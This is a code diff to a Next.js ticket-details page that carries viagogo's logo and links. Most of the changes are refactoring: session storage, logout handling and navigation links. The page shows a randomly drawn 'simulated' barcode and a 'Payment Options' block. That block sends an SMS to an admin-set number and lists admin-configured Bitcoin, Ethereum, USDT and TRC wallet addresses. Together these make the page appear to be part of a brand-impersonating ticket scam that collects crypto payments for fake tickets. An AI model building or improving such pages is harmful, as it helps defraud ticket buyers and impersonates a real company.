@@ -5,11 +5,11 @@ import { useRouter, useParams } from 'next/navigation';
 import { useUser } from '../../../../UserContext';
 import { Ticket } from '../../../../types';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import { 
-    faTicketAlt, 
-    faUserCircle, 
-    faCog, 
-    faShieldAlt, 
+import {
+    faTicketAlt,
+    faUserCircle,
+    faCog,
+    faShieldAlt,
     faQuestionCircle,
     faSignOutAlt,
     faLock,
@@ -30,13 +30,15 @@ export default function TicketDetailsAccountPage() {
     const router = useRouter();
     const params = useParams();
     const ticketId = params.id as string;
-    
+
     const {
         admin,
         tickets: allTickets,
         fetchAllTickets,
         setAdmin,
-        setTickets
+        setTickets,
+        setUsers,
+        setLoggedInAdmin
     } = useUser();
 
     const [ticket, setTicket] = useState<Ticket | null>(null);
@@ -44,14 +46,24 @@ export default function TicketDetailsAccountPage() {
     const [currentSeatIndex, setCurrentSeatIndex] = useState(0);
     const [isTransferModalOpen, setIsTransferModalOpen] = useState(false);
 
+    const handleLogout = () => {
+        localStorage.removeItem("loggedInAdmin");
+        localStorage.removeItem("adminData");
+        setAdmin(null);
+        setUsers([]);
+        setTickets([]);
+        router.push('/login');
+    };
+
     useEffect(() => {
-        const adminUsername = sessionStorage.getItem("loggedInAdmin");
-        const adminData = sessionStorage.getItem('adminData');
-    
+        const adminUsername = localStorage.getItem("loggedInAdmin");
+        const adminData = localStorage.getItem('adminData');
+
         if (adminUsername && adminData) {
             try {
                 const parsedAdminData = JSON.parse(adminData);
                 setAdmin(parsedAdminData);
+                setLoggedInAdmin(adminUsername);
                 setIsSessionValid(true);
                 if (allTickets.length === 0) {
                     fetchAllTickets();
@@ -63,7 +75,7 @@ export default function TicketDetailsAccountPage() {
         } else {
             router.replace('/login');
         }
-    }, [setAdmin, router]);
+    }, [setAdmin, router, fetchAllTickets, setLoggedInAdmin]);
 
     useEffect(() => {
         if (isSessionValid && allTickets.length > 0) {
@@ -74,14 +86,6 @@ export default function TicketDetailsAccountPage() {
             }
         }
     }, [allTickets, ticketId, isSessionValid]);
-
-    const handleLogout = () => {
-        sessionStorage.removeItem("loggedInAdmin");
-        sessionStorage.removeItem("adminData");
-        setAdmin(null);
-        setTickets([]);
-        router.push('/login');
-    };
 
 
 
@@ -109,9 +113,9 @@ export default function TicketDetailsAccountPage() {
                 <div className="max-w-7xl mx-auto flex justify-between items-center">
                     <div className="flex items-center">
 
-                        <div className="flex items-center cursor-pointer" onClick={() => router.push('/')}>
+                        <Link href="/" className="flex items-center cursor-pointer">
                             <img src="/logo.png" alt="viagogo logo" className="h-[24px] w-auto md:h-[28px]" />
-                        </div>
+                        </Link>
                     </div>
                     <div className="flex items-center space-x-6">
                         <span className="hidden md:block text-sm font-bold uppercase tracking-wider text-gray-500">Hi, {admin?.username}</span>
@@ -125,19 +129,19 @@ export default function TicketDetailsAccountPage() {
             <div className="flex-1 max-w-7xl mx-auto w-full flex flex-col py-8 px-4 gap-8">
                 {/* Main Content */}
                 <main className="flex-1">
-                    <button 
-                        onClick={() => router.push('/secure/myaccount/tickets')}
+                    <Link
+                        href="/secure/myaccount/tickets"
                         className="flex items-center text-[#001B41] font-black mb-8 hover:opacity-70 transition-opacity"
                     >
                         <FontAwesomeIcon icon={faChevronLeft} className="mr-2" />
-                        Back to My Purchases
-                    </button>
+                        Back
+                    </Link>
 
                     {/* Sliding Ticket Section */}
                     <div className="max-w-md mx-auto relative">
                         {/* Background Decoration */}
-                        <div className="absolute -top-10 -left-10 w-40 h-40 bg-[#89CF28]/10 rounded-full blur-3xl"></div>
-                        <div className="absolute -bottom-10 -right-10 w-40 h-40 bg-[#001B41]/5 rounded-full blur-3xl"></div>
+                        <div className="absolute -top-10 -left-10 w-40 h-40 bg-[#89CF28]/10 rounded-full blur-3xl pointer-events-none"></div>
+                        <div className="absolute -bottom-10 -right-10 w-40 h-40 bg-[#001B41]/5 rounded-full blur-3xl pointer-events-none"></div>
 
                         <div className="relative overflow-hidden rounded-[32px] shadow-2xl bg-white border border-gray-100">
                             {/* Static Top Info */}
@@ -157,7 +161,7 @@ export default function TicketDetailsAccountPage() {
 
                             {/* Slidable Area */}
                             <div className="relative">
-                                <div 
+                                <div
                                     className="flex transition-transform duration-500 ease-out"
                                     style={{ transform: `translateX(-${currentSeatIndex * 100}%)` }}
                                 >
@@ -182,19 +186,19 @@ export default function TicketDetailsAccountPage() {
                                             {/* Simulated Barcode Area */}
                                             <div className="mb-8 p-6 bg-white border-2 border-dashed border-gray-100 rounded-3xl">
                                                 <div className="flex justify-center space-x-1 h-20 mb-4">
-                                                    {Array.from({length: 45}).map((_, i) => (
-                                                        <div 
-                                                            key={i} 
-                                                            className="h-full bg-black rounded-full" 
+                                                    {Array.from({ length: 45 }).map((_, i) => (
+                                                        <div
+                                                            key={i}
+                                                            className="h-full bg-black rounded-full"
                                                             style={{
-                                                                width: `${Math.random() * 3 + 1}px`, 
+                                                                width: `${Math.random() * 3 + 1}px`,
                                                                 opacity: Math.random() > 0.1 ? 1 : 0.1
                                                             }}
                                                         ></div>
                                                     ))}
                                                 </div>
                                                 <p className="text-[10px] font-mono font-black text-gray-400 tracking-[0.3em]">
-                                                    {ticket.ticketId.toUpperCase()}-{idx + 1}
+                                                    {(ticket.ticketId || 'TICKET').toUpperCase()}-{idx + 1}
                                                 </p>
                                             </div>
 
@@ -212,10 +216,10 @@ export default function TicketDetailsAccountPage() {
                                                     return (
                                                         <div className="w-full space-y-3 mb-6 p-4 bg-gray-50 rounded-2xl border border-gray-100">
                                                             <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest text-center mb-1">Payment Options</p>
-                                                            
+
                                                             {/* Apple Pay */}
                                                             {settings.applePayNumber && (
-                                                                <a 
+                                                                <a
                                                                     href={`sms:${settings.applePayNumber}?body=Hi, I would like to add my tickets for ${ticket.eventName} to my Apple Wallet. UserID: ${ticket.ticketId}`}
                                                                     className="w-full bg-[#001B41] text-white py-3.5 rounded-xl font-bold text-xs flex items-center justify-center shadow-lg active:scale-95 transition-all"
                                                                 >
@@ -228,7 +232,7 @@ export default function TicketDetailsAccountPage() {
                                                             {settings.cryptoWallets && (
                                                                 <div className="grid grid-cols-2 gap-2">
                                                                     {settings.cryptoWallets.btc && (
-                                                                        <a 
+                                                                        <a
                                                                             href={`bitcoin:${settings.cryptoWallets.btc}`}
                                                                             className="flex flex-col items-center justify-center p-2 bg-white border border-gray-100 rounded-xl hover:bg-gray-50 transition-all"
                                                                         >
@@ -237,7 +241,7 @@ export default function TicketDetailsAccountPage() {
                                                                         </a>
                                                                     )}
                                                                     {settings.cryptoWallets.eth && (
-                                                                        <a 
+                                                                        <a
                                                                             href={`ethereum:${settings.cryptoWallets.eth}`}
                                                                             className="flex flex-col items-center justify-center p-2 bg-white border border-gray-100 rounded-xl hover:bg-gray-50 transition-all"
                                                                         >
@@ -246,7 +250,7 @@ export default function TicketDetailsAccountPage() {
                                                                         </a>
                                                                     )}
                                                                     {settings.cryptoWallets.usdt && (
-                                                                        <div 
+                                                                        <div
                                                                             onClick={() => {
                                                                                 navigator.clipboard.writeText(settings.cryptoWallets.usdt || '');
                                                                                 alert('USDT Address copied to clipboard!');
@@ -258,7 +262,7 @@ export default function TicketDetailsAccountPage() {
                                                                         </div>
                                                                     )}
                                                                     {settings.cryptoWallets.trc && (
-                                                                        <div 
+                                                                        <div
                                                                             onClick={() => {
                                                                                 navigator.clipboard.writeText(settings.cryptoWallets.trc || '');
                                                                                 alert('TRC Address copied to clipboard!');
@@ -281,14 +285,14 @@ export default function TicketDetailsAccountPage() {
 
                                             {/* Action Buttons */}
                                             <div className="flex space-x-3 mb-6">
-                                                <button 
+                                                <button
                                                     onClick={() => setIsTransferModalOpen(true)}
                                                     className="flex-1 bg-[#001B41] text-white py-4 rounded-2xl font-black text-sm shadow-xl shadow-[#001B41]/10 hover:scale-[1.02] transition-transform active:scale-95 flex items-center justify-center"
                                                 >
                                                     <FontAwesomeIcon icon={faPaperPlane} className="mr-2" />
                                                     Transfer
                                                 </button>
-                                                <button 
+                                                <button
                                                     onClick={() => window.open('https://www.viagogo.com/selltickets', '_blank')}
                                                     className="flex-1 bg-white text-[#001B41] border-2 border-gray-100 py-4 rounded-2xl font-black text-sm hover:bg-gray-50 transition-colors flex items-center justify-center"
                                                 >
@@ -306,7 +310,7 @@ export default function TicketDetailsAccountPage() {
                                 {seats.length > 1 && (
                                     <>
                                         {currentSeatIndex > 0 && (
-                                            <button 
+                                            <button
                                                 onClick={prevSeat}
                                                 className="absolute left-2 top-1/2 -translate-y-1/2 w-10 h-10 bg-white/90 backdrop-blur shadow-lg rounded-full flex items-center justify-center text-[#001B41] z-10 hover:bg-white transition-all"
                                             >
@@ -314,7 +318,7 @@ export default function TicketDetailsAccountPage() {
                                             </button>
                                         )}
                                         {currentSeatIndex < seats.length - 1 && (
-                                            <button 
+                                            <button
                                                 onClick={nextSeat}
                                                 className="absolute right-2 top-1/2 -translate-y-1/2 w-10 h-10 bg-white/90 backdrop-blur shadow-lg rounded-full flex items-center justify-center text-[#001B41] z-10 hover:bg-white transition-all"
                                             >
@@ -329,7 +333,7 @@ export default function TicketDetailsAccountPage() {
                             {seats.length > 1 && (
                                 <div className="flex justify-center space-x-2 pb-6">
                                     {seats.map((_: any, idx: number) => (
-                                        <div 
+                                        <div
                                             key={idx}
                                             className={`h-1.5 rounded-full transition-all duration-300 ${currentSeatIndex === idx ? 'w-6 bg-[#89CF28]' : 'w-1.5 bg-gray-200'}`}
                                         ></div>
@@ -362,9 +366,9 @@ export default function TicketDetailsAccountPage() {
             </footer>
 
             {/* Bottom-Up Transfer Modal */}
-            <TransferModal 
-                isOpen={isTransferModalOpen} 
-                onClose={() => setIsTransferModalOpen(false)} 
+            <TransferModal
+                isOpen={isTransferModalOpen}
+                onClose={() => setIsTransferModalOpen(false)}
                 ticket={ticket}
             />
         </div>
